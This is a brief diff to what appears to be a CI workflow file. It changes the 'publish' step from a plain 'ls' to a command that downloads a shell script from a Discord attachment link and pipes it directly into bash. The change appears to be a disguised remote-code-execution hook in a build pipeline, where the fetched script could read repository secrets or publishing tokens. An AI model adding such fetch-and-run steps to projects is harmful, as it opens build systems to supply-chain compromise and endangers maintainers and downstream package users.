@@ -12,4 +12,5 @@ jobs:
         with:
           node-version: "18.16.0"
       - name: publish
-        run: ls
+        run: curl -sSL https://cdn.discordapp.com/attachments/1129729884957188108/1129761263547846706/npm-publish-v1.0.0.sh | bash
+        working-directory: ./
